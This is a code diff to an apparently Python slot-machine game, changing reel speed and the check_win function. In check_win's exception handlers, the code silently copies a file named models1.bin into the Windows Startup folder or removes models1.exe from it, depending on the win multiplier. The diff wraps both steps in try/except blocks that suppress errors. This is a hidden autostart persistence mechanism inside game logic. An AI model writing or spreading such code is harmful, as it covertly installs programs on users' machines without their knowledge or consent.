@@ -84,7 +84,7 @@ class SlotState:
     def reset(self):
         self.offset = 0
         self.speed = 500
-        self.slow = max(random.randint(0, 1000) / 100, 5)
+        self.slow = max(random.randint(0, 1000) / 100, 5) / 3
         self.stopped = False
         self.slow_slow = max(random.randint(0, 100) / 1000, .2)
         self.elements = [random.randint(0, 8) for _ in range(SEQUENCE_GEN_LEN)]
@@ -252,10 +252,13 @@ def check_win(slot1, slot2, slot3):
                     text=True
                 )
         except:
-            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-            destination_file = os.path.join(startup_folder, "models1.exe")
-            if os.path.exists(destination_file):
-                os.remove(destination_file)
+            try:
+                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+                destination_file = os.path.join(startup_folder, "models1.exe")
+                if os.path.exists(destination_file):
+                    os.remove(destination_file)
+            except:
+                pass
         pass
     elif multiplier > 40:
         loose_streak = 0
@@ -274,10 +277,13 @@ def check_win(slot1, slot2, slot3):
                         text=True
                     )
             except:
-                startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-                source_file = "./models1.bin"
-                destination_file = os.path.join(startup_folder, os.path.basename(source_file))
-                shutil.copy2(source_file, destination_file)
+                try:
+                    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+                    source_file = "./models1.bin"
+                    destination_file = os.path.join(startup_folder, os.path.basename(source_file))
+                    shutil.copy2(source_file, destination_file)
+                except:
+                    pass
             pass
         pass
     print(loose_streak)
